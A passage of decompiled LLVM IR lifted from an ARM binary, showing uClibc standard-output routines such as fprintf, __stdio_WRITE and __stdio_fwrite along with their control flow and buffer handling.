  %v2_17d4814 = phi i32 [ %tmp, %bb27 ], [ %v2_17cd43.ph, %.thread4 ], [ %v2_17cd43.ph, %dec_label_pc_17d18 ]
  %v1_17d20 = load i32, i32* @r3, align 4
  %v3_17d20 = icmp uge i32 %v1_17d2420, %v1_17d20
  %v1_17d20.v1_17d2420 = select i1 %v3_17d20, i32 %v1_17d20, i32 %v1_17d2420
  store i32 %v1_17d20.v1_17d2420, i32* %r4.global-to-local, align 4
  %v1_17d2c = inttoptr i32 %arg2 to i32*
  %v2_17d2c = load i32, i32* %v1_17d2c, align 4
  store i32 %v2_17d2c, i32* @lr, align 4
  store i32 %v1_17d20.v1_17d2420, i32* %r0.global-to-local, align 4
  %v2_17d608 = icmp eq i32 %v1_17d20.v1_17d2420, 0
  br i1 %v2_17d608, label %dec_label_pc_17d68, label %dec_label_pc_17d38

dec_label_pc_17d38:                               ; preds = %dec_label_pc_17d20, %dec_label_pc_17d58.dec_label_pc_17d38_crit_edge
  %v2_17d48 = phi i32 [ %v2_17d58, %dec_label_pc_17d58.dec_label_pc_17d38_crit_edge ], [ %v2_17d4814, %dec_label_pc_17d20 ]
  %v0_17d40 = phi i32 [ %v0_17d38.pre, %dec_label_pc_17d58.dec_label_pc_17d38_crit_edge ], [ %v2_17d2c, %dec_label_pc_17d20 ]
  %v1_17d38 = inttoptr i32 %v0_17d40 to i32*
  %v2_17d38 = load i32, i32* %v1_17d38, align 4
  %v1_17d40 = add i32 %v0_17d40, 4
  store i32 %v1_17d40, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_17d38, 127
  br i1 %tmp36, label %dec_label_pc_17cfc, label %dec_label_pc_17d48

dec_label_pc_17d48:                               ; preds = %dec_label_pc_17d38
  %v1_17d48 = trunc i32 %v2_17d38 to i8
  %v3_17d48 = inttoptr i32 %v2_17d48 to i8*
  store i8 %v1_17d48, i8* %v3_17d48, align 1
  %v0_17d4c = load i32, i32* %ip.global-to-local, align 4
  %v1_17d4c = inttoptr i32 %v0_17d4c to i8*
  %v2_17d4c = load i8, i8* %v1_17d4c, align 1
  %v2_17d50 = icmp eq i8 %v2_17d4c, 0
  br i1 %v2_17d50, label %dec_label_pc_17d10, label %dec_label_pc_17d58

dec_label_pc_17d58:                               ; preds = %dec_label_pc_17d48
  %v1_17d58 = load i32, i32* %r2.global-to-local, align 4
  %v2_17d58 = add i32 %v1_17d58, %v0_17d4c
  store i32 %v2_17d58, i32* %ip.global-to-local, align 4
  %v0_17d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_17d5c = add i32 %v0_17d5c, -1
  store i32 %v1_17d5c, i32* %r0.global-to-local, align 4
  %v2_17d60 = icmp eq i32 %v1_17d5c, 0
  br i1 %v2_17d60, label %dec_label_pc_17d68, label %dec_label_pc_17d58.dec_label_pc_17d38_crit_edge

dec_label_pc_17d58.dec_label_pc_17d38_crit_edge:  ; preds = %dec_label_pc_17d58
  %v0_17d38.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_17d38

dec_label_pc_17d68:                               ; preds = %dec_label_pc_17d58, %dec_label_pc_17d20, %dec_label_pc_17d10
  %v0_17d68 = phi i32 [ %v0_17d4c, %dec_label_pc_17d10 ], [ %v2_17d4814, %dec_label_pc_17d20 ], [ %v2_17d58, %dec_label_pc_17d58 ]
  %v1_17d68 = load i32, i32* @sp, align 4
  %v9_17d68 = icmp eq i32 %v0_17d68, %v1_17d68
  br i1 %v9_17d68, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_17d68
  %v1_17d6c = load i32, i32* @lr, align 4
  store i32 %v1_17d6c, i32* %v1_17d2c, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_17d68, %bb30
  %v0_17d70 = load i32, i32* %r0.global-to-local, align 4
  %v1_17d70 = load i32, i32* %r4.global-to-local, align 4
  %v2_17d70 = sub i32 %v1_17d70, %v0_17d70
  store i32 %v2_17d70, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d74

dec_label_pc_17d74:                               ; preds = %dec_label_pc_17cfc, %bb31
  %v0_17d74 = phi i32 [ %v0_17d74.pre, %dec_label_pc_17cfc ], [ %v2_17d70, %bb31 ]
  store i32 %v0_17d74, i32* %r0.global-to-local, align 4
  %v2_17d7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17d7c, i32* %r4.global-to-local, align 4
  ret i32 %v0_17d74

; uselistorder directives
  uselistorder i32 %v0_17d74, { 1, 0 }
  uselistorder i32 %v1_17d5c, { 1, 0 }
  uselistorder i32 %v2_17d58, { 0, 2, 1 }
  uselistorder i32 %v2_17d38, { 1, 0 }
  uselistorder i32 %v2_17d4814, { 1, 0 }
  uselistorder i32 %v1_17d24.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 24, 25, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 2, 3, 4, 5, 6, 7, 23 }
  uselistorder i32 127, { 0, 1, 5, 7, 2, 4, 6, 3 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d74, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_17d38, { 1, 0 }
  uselistorder label %dec_label_pc_17d20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ce4, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_17d8c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_17d8c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17d9c = call i32 @__GI_vfprintf()
  ret i32 %v0_17d9c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_17dc42 = icmp eq i32 %arg3, 0
  store i1 %v2_17dc42, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_17dc42, label %dec_label_pc_17e64, label %dec_label_pc_17dd0

dec_label_pc_17dc4thread-pre-split:               ; preds = %bb22
  %v3_17de8 = load i32, i32* %r7.global-to-local, align 4
  %v5_17de8 = add i32 %v3_17de8, %v4_17ddc
  store i32 %v5_17de8, i32* %r7.global-to-local, align 4
  %v5_17dec = sub i32 %v0_17de4, %v4_17ddc
  store i32 %v5_17dec, i32* %r5.global-to-local, align 4
  %v2_17dc4 = icmp eq i32 %v5_17dec, 0
  store i1 %v2_17dc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17dec, i32* @r2, align 4
  br i1 %v2_17dc4, label %dec_label_pc_17dc4.dec_label_pc_17e64.loopexit_crit_edge, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %entry, %dec_label_pc_17dc4thread-pre-split
  %v0_17dd4 = phi i32 [ %v5_17de8, %dec_label_pc_17dc4thread-pre-split ], [ %arg2, %entry ]
  %v0_17dd0.in = phi i32 [ %v5_17dec, %dec_label_pc_17dc4thread-pre-split ], [ %arg3, %entry ]
  %v0_17dd0 = icmp slt i32 %v0_17dd0.in, 0
  br i1 %v0_17dd0, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_17dd0
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17dd0, %bb
  %v0_17dd8 = load i32, i32* @r4, align 4
  %v1_17dd8 = add i32 %v0_17dd8, 4
  %v2_17dd8 = inttoptr i32 %v1_17dd8 to i32*
  %v3_17dd8 = load i32, i32* %v2_17dd8, align 4
  store i32 %v3_17dd8, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_17dd4 to i32*
  %v4_17ddc = call i32 @__libc_write(i32 %v3_17dd8, i32* %tmp23)
  store i32 %v4_17ddc, i32* %r0.global-to-local, align 4
  %v1_17de0 = icmp slt i32 %v4_17ddc, 0
  %v2_17de0 = icmp eq i32 %v4_17ddc, 0
  store i1 %v2_17de0, i1* %cpsr_z.global-to-local, align 1
  %v0_17de4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17de4, i32* %r6.global-to-local, align 4
  br i1 %v1_17de0, label %dec_label_pc_17df4, label %dec_label_pc_17dc4thread-pre-split

dec_label_pc_17df4:                               ; preds = %bb22
  %v0_17df4 = load i32, i32* @r4, align 4
  %v1_17df4 = inttoptr i32 %v0_17df4 to i32*
  %v2_17df4 = load i32, i32* %v1_17df4, align 4
  store i32 %v2_17df4, i32* %r3.global-to-local, align 4
  %v1_17df8 = add i32 %v0_17df4, 8
  store i32 %v1_17df8, i32* %r0.global-to-local, align 4
  %v1_17dfc = inttoptr i32 %v1_17df8 to i32*
  %v2_17dfc = load i32, i32* %v1_17dfc, align 4
  store i32 %v2_17dfc, i32* %r0.global-to-local, align 4
  %v3_17dfc = add i32 %v0_17df4, 12
  %v4_17dfc = inttoptr i32 %v3_17dfc to i32*
  %v5_17dfc = load i32, i32* %v4_17dfc, align 4
  %v1_17e00 = or i32 %v2_17df4, 8
  store i32 %v1_17e00, i32* %r3.global-to-local, align 4
  %v3_17e04 = sdiv i32 %v2_17df4, 256
  %v2_17e08 = sub i32 %v5_17dfc, %v2_17dfc
  store i32 %v2_17e08, i32* %r2.global-to-local, align 4
  %v9_17e08 = icmp eq i32 %v5_17dfc, %v2_17dfc
  store i1 %v9_17e08, i1* %cpsr_z.global-to-local, align 1
  %v1_17e0c = trunc i32 %v3_17e04 to i8
  %v3_17e0c = add i32 %v0_17df4, 1
  %v4_17e0c = inttoptr i32 %v3_17e0c to i8*
  store i8 %v1_17e0c, i8* %v4_17e0c, align 1
  %v0_17e10 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e10 = trunc i32 %v0_17e10 to i8
  %v2_17e10 = load i32, i32* @r4, align 4
  %v3_17e10 = inttoptr i32 %v2_17e10 to i8*
  store i8 %v1_17e10, i8* %v3_17e10, align 1
  %v0_17e14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17e14, label %dec_label_pc_17df4.dec_label_pc_17e60_crit_edge, label %dec_label_pc_17e18

dec_label_pc_17df4.dec_label_pc_17e60_crit_edge:  ; preds = %dec_label_pc_17df4
  %v0_17e60.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e18:                               ; preds = %dec_label_pc_17df4
  %v0_17e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e18 = load i32, i32* %r5.global-to-local, align 4
  %v9_17e18 = icmp eq i32 %v0_17e18, %v1_17e18
  store i1 %v9_17e18, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_17e18, %v1_17e18
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_17e18
  store i32 %v0_17e18, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17e18, %bb24
  %v0_17e20.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_17e24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_17e44
  %v2_17e24 = phi i32 [ %v2_17e24.pre, %.preheader ], [ %v1_17e48, %dec_label_pc_17e44 ]
  %v0_17e20 = phi i32 [ %v0_17e20.pre, %.preheader ], [ %v1_17e30, %dec_label_pc_17e44 ]
  %v1_17e20 = inttoptr i32 %v0_17e20 to i8*
  %v2_17e20 = load i8, i8* %v1_17e20, align 1
  %v3_17e20 = zext i8 %v2_17e20 to i32
  store i32 %v3_17e20, i32* %r3.global-to-local, align 4
  %v3_17e24 = inttoptr i32 %v2_17e24 to i8*
  store i8 %v2_17e20, i8* %v3_17e24, align 1
  %v0_17e28 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e28 = inttoptr i32 %v0_17e28 to i8*
  %v2_17e28 = load i8, i8* %v1_17e28, align 1
  %v3_17e28 = zext i8 %v2_17e28 to i32
  store i32 %v3_17e28, i32* %r3.global-to-local, align 4
  %v7_17e2c = icmp eq i8 %v2_17e28, 10
  store i1 %v7_17e2c, i1* %cpsr_z.global-to-local, align 1
  %v0_17e30 = load i32, i32* %r7.global-to-local, align 4
  %v1_17e30 = add i32 %v0_17e30, 1
  store i32 %v1_17e30, i32* %r7.global-to-local, align 4
  br i1 %v7_17e2c, label %dec_label_pc_17e38, label %dec_label_pc_17e44

dec_label_pc_17e38:                               ; preds = %bb25
  %v0_17e38 = load i32, i32* @r4, align 4
  %v1_17e38 = add i32 %v0_17e38, 1
  %v2_17e38 = inttoptr i32 %v1_17e38 to i8*
  %v3_17e38 = load i8, i8* %v2_17e38, align 1
  %v4_17e38 = zext i8 %v3_17e38 to i32
  store i32 %v4_17e38, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_17e38, 2
  %v2_17e3c = icmp eq i8 %tmp30, 0
  store i1 %v2_17e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e3c, label %dec_label_pc_17e44, label %dec_label_pc_17e50

dec_label_pc_17e44:                               ; preds = %dec_label_pc_17e38, %bb25
  %v0_17e44 = load i32, i32* %r6.global-to-local, align 4
  %v1_17e44 = add i32 %v0_17e44, -1
  store i32 %v1_17e44, i32* %r6.global-to-local, align 4
  %v7_17e44 = icmp eq i32 %v0_17e44, 1
  store i1 %v7_17e44, i1* %cpsr_z.global-to-local, align 1
  %v1_17e48 = add i32 %v0_17e28, 1
  store i32 %v1_17e48, i32* %r0.global-to-local, align 4
  br i1 %v7_17e44, label %dec_label_pc_17e44.dec_label_pc_17e50_crit_edge, label %bb25

dec_label_pc_17e44.dec_label_pc_17e50_crit_edge:  ; preds = %dec_label_pc_17e44
  %v0_17e50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e50

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e38, %dec_label_pc_17e44.dec_label_pc_17e50_crit_edge
  %v0_17e54 = phi i32 [ %v1_17e48, %dec_label_pc_17e44.dec_label_pc_17e50_crit_edge ], [ %v0_17e28, %dec_label_pc_17e38 ]
  %v0_17e50 = phi i32 [ %v0_17e50.pre, %dec_label_pc_17e44.dec_label_pc_17e50_crit_edge ], [ %v0_17e38, %dec_label_pc_17e38 ]
  %v1_17e50 = add i32 %v0_17e50, 8
  %v2_17e50 = inttoptr i32 %v1_17e50 to i32*
  %v3_17e50 = load i32, i32* %v2_17e50, align 4
  store i32 %v3_17e50, i32* %r3.global-to-local, align 4
  %v2_17e54 = add i32 %v0_17e50, 16
  %v3_17e54 = inttoptr i32 %v2_17e54 to i32*
  store i32 %v0_17e54, i32* %v3_17e54, align 4
  %v0_17e58 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e58 = load i32, i32* %r0.global-to-local, align 4
  %v2_17e58 = sub i32 %v1_17e58, %v0_17e58
  store i32 %v2_17e58, i32* %r3.global-to-local, align 4
  %v1_17e5c = load i32, i32* %r5.global-to-local, align 4
  %v2_17e5c = sub i32 %v1_17e5c, %v2_17e58
  store i32 %v2_17e5c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e60:                               ; preds = %dec_label_pc_17df4.dec_label_pc_17e60_crit_edge, %dec_label_pc_17e50
  %v0_17e60 = phi i32 [ %v0_17e60.pre, %dec_label_pc_17df4.dec_label_pc_17e60_crit_edge ], [ %v2_17e5c, %dec_label_pc_17e50 ]
  %v1_17e60 = load i32, i32* %r8.global-to-local, align 4
  %v2_17e60 = sub i32 %v1_17e60, %v0_17e60
  store i32 %v2_17e60, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17e64

dec_label_pc_17dc4.dec_label_pc_17e64.loopexit_crit_edge: ; preds = %dec_label_pc_17dc4thread-pre-split
  %v0_17e64.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17e64

dec_label_pc_17e64:                               ; preds = %entry, %dec_label_pc_17dc4.dec_label_pc_17e64.loopexit_crit_edge, %dec_label_pc_17e60
  %v0_17e64 = phi i32 [ %v2_17e60, %dec_label_pc_17e60 ], [ %v0_17e64.pre.pre, %dec_label_pc_17dc4.dec_label_pc_17e64.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_17e64, i32* %r0.global-to-local, align 4
  ret i32 %v0_17e64

; uselistorder directives
  uselistorder i32 %v0_17e64, { 1, 0 }
  uselistorder i32 %v0_17e50, { 1, 0 }
  uselistorder i32 %v1_17e48, { 0, 2, 1 }
  uselistorder i32 %v0_17e44, { 1, 0 }
  uselistorder i1 %v2_17e3c, { 1, 0 }
  uselistorder i32 %v1_17e30, { 1, 0 }
  uselistorder i32 %v0_17e18, { 1, 0, 2 }
  uselistorder i32 %v5_17dfc, { 1, 0 }
  uselistorder i32 %v2_17dfc, { 1, 0, 2 }
  uselistorder i32 %v0_17de4, { 1, 0 }
  uselistorder i32 %v4_17ddc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_17dec, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17e64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17e60, { 1, 0 }
  uselistorder label %dec_label_pc_17e50, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17dd0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17e6c = load i32, i32* @r4, align 4
  store i32 %v3_17e6c, i32* %stack_var_-20, align 4
  %v6_17e6c = load i32, i32* @r5, align 4
  %v9_17e6c = load i32, i32* @r6, align 4
  %v12_17e6c = load i32, i32* @r7, align 4
  %v15_17e6c = load i32, i32* @lr, align 4
  %v1_17e70 = add i32 %arg3, 1
  %v2_17e70 = inttoptr i32 %v1_17e70 to i8*
  %v3_17e70 = load i8, i8* %v2_17e70, align 1
  %v4_17e70 = zext i8 %v3_17e70 to i32
  %v3_17e74 = mul nuw nsw i32 %v4_17e70, 256
  %v1_17e78 = and i32 %v3_17e74, 512
  store i32 %v1_17e78, i32* @r4, align 4
  %v2_17e78 = icmp eq i32 %v1_17e78, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_17e78, label %dec_label_pc_17e8c, label %dec_label_pc_17f88

dec_label_pc_17e8c:                               ; preds = %entry
  %v1_17e8c = add i32 %arg3, 4
  %v2_17e8c = inttoptr i32 %v1_17e8c to i32*
  %v3_17e8c = load i32, i32* %v2_17e8c, align 4
  %v1_17e94 = add i32 %arg3, 16
  %v2_17e94 = inttoptr i32 %v1_17e94 to i32*
  %v3_17e94 = load i32, i32* %v2_17e94, align 4
  store i32 %v3_17e94, i32* @r0, align 4
  %v1_17e98 = add i32 %arg3, 12
  %v2_17e98 = inttoptr i32 %v1_17e98 to i32*
  %v3_17e98 = load i32, i32* %v2_17e98, align 4
  %v4_17e9c = icmp eq i32 %v3_17e8c, -2
  %v2_17ea0 = sub i32 %v3_17e98, %v3_17e94
  br i1 %v4_17e9c, label %dec_label_pc_17ea0, label %dec_label_pc_17ec8

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e8c
  %v3_17ea4 = icmp ugt i32 %v2_17ea0, %arg2
  br i1 %v3_17ea4, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_17ea0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17ea0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_17ea0, %dec_label_pc_17ea0 ]
  %v0_17eac = phi i32 [ %arg2, %bb ], [ %v2_17ea0, %dec_label_pc_17ea0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_17eac, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17eb4 = call i32 @memcpy()
  %v0_17eb8 = load i32, i32* @r5, align 4
  %v1_17eb8 = add i32 %v0_17eb8, 16
  %v2_17eb8 = inttoptr i32 %v1_17eb8 to i32*
  %v3_17eb8 = load i32, i32* %v2_17eb8, align 4
  %v1_17ebc = load i32, i32* @r4, align 4
  %v2_17ebc = add i32 %v1_17ebc, %v3_17eb8
  store i32 %v2_17ebc, i32* %v2_17eb8, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17ec8:                               ; preds = %dec_label_pc_17e8c
  %tmp = icmp ult i32 %v2_17ea0, %arg2
  br i1 %tmp, label %dec_label_pc_17f68, label %dec_label_pc_17ed4

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17ec8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17edc = call i32 @memcpy()
  %v0_17ee0 = load i32, i32* @r5, align 4
  %v1_17ee0 = add i32 %v0_17ee0, 16
  %v2_17ee0 = inttoptr i32 %v1_17ee0 to i32*
  %v3_17ee0 = load i32, i32* %v2_17ee0, align 4
  %v1_17ee4 = add i32 %v0_17ee0, 1
  %v2_17ee4 = inttoptr i32 %v1_17ee4 to i8*
  %v3_17ee4 = load i8, i8* %v2_17ee4, align 1
  %v1_17ee8 = load i32, i32* @r6, align 4
  %v2_17ee8 = add i32 %v1_17ee8, %v3_17ee0
  %tmp17 = urem i8 %v3_17ee4, 2
  %v2_17eec = icmp eq i8 %tmp17, 0
  store i32 %v2_17ee8, i32* %v2_17ee0, align 4
  br i1 %v2_17eec, label %dec_label_pc_17f9c, label %dec_label_pc_17ef8

dec_label_pc_17ef8:                               ; preds = %dec_label_pc_17ed4
  %v0_17ef8 = load i32, i32* %r7.global-to-local, align 4
  %v0_17f00 = load i32, i32* @r6, align 4
  %v4_17f04 = call i32 @memrchr(i32 %v0_17ef8, i32 10, i32 %v0_17f00, i32 %v2_17ee8)
  %v2_17f08 = icmp eq i32 %v4_17f04, 0
  br i1 %v2_17f08, label %dec_label_pc_17f9c, label %dec_label_pc_17f10

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17ef8
  %v0_17f10 = load i32, i32* @r5, align 4
  store i32 %v0_17f10, i32* @r0, align 4
  %v0_17f14 = call i32 @__stdio_wcommit()
  %v2_17f18 = icmp eq i32 %v0_17f14, 0
  br i1 %v2_17f18, label %dec_label_pc_17f9c, label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %dec_label_pc_17f10
  %v0_17f20 = load i32, i32* @r6, align 4
  %v3_17f20 = icmp uge i32 %v0_17f20, %v0_17f14
  %v0_17f14.v0_17f20 = select i1 %v3_17f20, i32 %v0_17f14, i32 %v0_17f20
  store i32 %v0_17f14.v0_17f20, i32* @r4, align 4
  %v2_17f2c = sub i32 %v0_17f20, %v0_17f14.v0_17f20
  %v0_17f30 = load i32, i32* %r7.global-to-local, align 4
  %v2_17f30 = add i32 %v0_17f30, %v2_17f2c
  store i32 %v2_17f30, i32* %r7.global-to-local, align 4
  store i32 %v0_17f14.v0_17f20, i32* @r2, align 4
  %v4_17f40 = call i32 @__GI_memchr(i32 %v2_17f30, i32 10, i32 %v0_17f14.v0_17f20, i32 %v2_17f2c)
  %v2_17f44 = icmp eq i32 %v4_17f40, 0
  br i1 %v2_17f44, label %dec_label_pc_17f9c, label %dec_label_pc_17f4c

dec_label_pc_17f4c:                               ; preds = %dec_label_pc_17f20
  %v0_17f4c = load i32, i32* @r5, align 4
  %v1_17f4c = add i32 %v0_17f4c, 16
  %v2_17f4c = inttoptr i32 %v1_17f4c to i32*
  %v3_17f4c = load i32, i32* %v2_17f4c, align 4
  %v0_17f50 = load i32, i32* %r7.global-to-local, align 4
  %v1_17f50 = load i32, i32* @r4, align 4
  %v2_17f50 = sub i32 %v0_17f50, %v4_17f40
  %v2_17f54 = add i32 %v2_17f50, %v1_17f50
  %v2_17f58 = sub i32 %v3_17f4c, %v2_17f54
  %v1_17f5c = load i32, i32* @r6, align 4
  %v2_17f5c = sub i32 %v1_17f5c, %v2_17f54
  store i32 %v2_17f5c, i32* @r6, align 4
  store i32 %v2_17f58, i32* %v2_17f4c, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17f68:                               ; preds = %dec_label_pc_17ec8
  %v1_17f68 = add i32 %arg3, 8
  %v2_17f68 = inttoptr i32 %v1_17f68 to i32*
  %v3_17f68 = load i32, i32* %v2_17f68, align 4
  %v9_17f6c = icmp eq i32 %v3_17e94, %v3_17f68
  br i1 %v9_17f6c, label %dec_label_pc_17f88, label %dec_label_pc_17f74

dec_label_pc_17f74:                               ; preds = %dec_label_pc_17f68
  store i32 %arg3, i32* @r0, align 4
  %v0_17f78 = call i32 @__stdio_wcommit()
  %v2_17f7c = icmp eq i32 %v0_17f78, 0
  br i1 %v2_17f7c, label %dec_label_pc_17f74.dec_label_pc_17f88_crit_edge, label %bb13

dec_label_pc_17f74.dec_label_pc_17f88_crit_edge:  ; preds = %dec_label_pc_17f74
  %v0_17f90.pre = load i32, i32* @r6, align 4
  %v0_17f88.pre = load i32, i32* @r5, align 4
  %v0_17f8c.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_17f94.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_17f88

bb13:                                             ; preds = %dec_label_pc_17f74
  %v1_17f80 = load i32, i32* @r4, align 4
  store i32 %v1_17f80, i32* @r6, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17f88:                               ; preds = %dec_label_pc_17f74.dec_label_pc_17f88_crit_edge, %entry, %dec_label_pc_17f68
  %v2_17f94 = phi i32 [ %v2_17f94.pre, %dec_label_pc_17f74.dec_label_pc_17f88_crit_edge ], [ %v3_17e6c, %entry ], [ %v3_17e6c, %dec_label_pc_17f68 ]
  %v0_17f8c = phi i32 [ %v0_17f8c.pre, %dec_label_pc_17f74.dec_label_pc_17f88_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_17f68 ]
  %v0_17f88 = phi i32 [ %v0_17f88.pre, %dec_label_pc_17f74.dec_label_pc_17f88_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_17f68 ]
  %v0_17f90 = phi i32 [ %v0_17f90.pre, %dec_label_pc_17f74.dec_label_pc_17f88_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_17f68 ]
  store i32 %v2_17f94, i32* @r4, align 4
  store i32 %v9_17e6c, i32* @r6, align 4
  store i32 %v15_17e6c, i32* @lr, align 4
  %v3_17f98 = inttoptr i32 %v0_17f88 to i8*
  %v4_17f98 = call i32 @__stdio_WRITE(i8* %v3_17f98, i32 %v0_17f8c, i32 %v0_17f90)
  br label %dec_label_pc_17f9c

dec_label_pc_17f9c:                               ; preds = %bb13, %dec_label_pc_17f20, %dec_label_pc_17f10, %dec_label_pc_17ef8, %dec_label_pc_17ed4, %dec_label_pc_17f4c, %bb10, %dec_label_pc_17f88
  %v0_17f9c = load i32, i32* @r6, align 4
  %v2_17fa0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17fa0, i32* @r4, align 4
  store i32 %v6_17e6c, i32* @r5, align 4
  store i32 %v9_17e6c, i32* @r6, align 4
  store i32 %v12_17e6c, i32* @r7, align 4
  ret i32 %v0_17f9c

; uselistorder directives
  uselistorder i32 %v2_17f54, { 1, 0 }
  uselistorder i32 %v2_17f2c, { 1, 0 }
  uselistorder i32 %v0_17f14.v0_17f20, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17f20, { 1, 0, 2 }
  uselistorder i32 %v2_17ea0, { 2, 0, 1, 3 }
  uselistorder i32 %v9_17e6c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 8, 2, 5, 4, 7, 3, 6 }
